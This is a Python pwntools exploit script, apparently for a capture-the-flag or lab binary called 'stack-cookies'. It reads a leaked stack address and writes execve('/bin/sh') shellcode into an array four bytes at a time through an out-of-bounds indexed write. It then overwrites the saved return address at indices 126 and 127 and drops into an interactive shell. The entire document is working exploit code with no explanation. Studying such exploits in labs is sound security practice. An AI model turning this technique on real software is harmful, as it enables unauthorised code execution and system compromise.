from pwn import *
from binascii import hexlify

ASSEMBLY = shellcraft.amd64.linux.execve("/bin/sh")

p = process("./stack-cookies")

log.info("Getting address...")

# skip all output up to the address leak
r = p.recvuntil(b"The address of the array is ")

r = p.recvuntil(b"\n").decode("utf-8").strip()
addr = int(r, 16)

log.info("Got address")

payload = b""

shellcode = asm(ASSEMBLY, arch="amd64", bits=64)

payload += shellcode
payload += b'A'*(4 - len(payload) %4)

p.recv()

log.info("Sending payload")
# make sure we get those last 0-3 bytes
for offset in range(0, len(shellcode)+3, 4):
    log.info("Sending bytes {0} to {1}".format(offset, offset+4))
    index = offset // 4
    p.send(b"2\n")
    p.recv()
    p.send("{}\n".format(index).encode("utf-8"))
    p.recv()
    # grab 4 bytes, then turn it into a number
    p.send(str(unpack(payload[offset:offset+4])).encode("utf-8") + b"\n")
    p.recv()

log.info("Payload sent")

log.info("Setting return address of 0x{:016x}".format(addr))

# we had to split it into two pieces
addr_bytes = pack(addr, word_size=64)
print(addr_bytes)
p.send(b"2\n")
p.recv()
p.send(b"126\n")
p.recv()
print(str(unpack(addr_bytes[0:4])).encode("utf-8") + b"\n")
p.send(str(unpack(addr_bytes[0:4])).encode("utf-8") + b"\n")
p.recv()
p.send(b"2\n")
p.recv()
p.send(b"127\n")
p.recv()
print(str(unpack(addr_bytes[4:8])).encode("utf-8") + b"\n")
p.send(str(unpack(addr_bytes[4:8])).encode("utf-8") + b"\n")
p.recv()

log.info("Return address set")

p.send(b"3\n")

p.interactive()
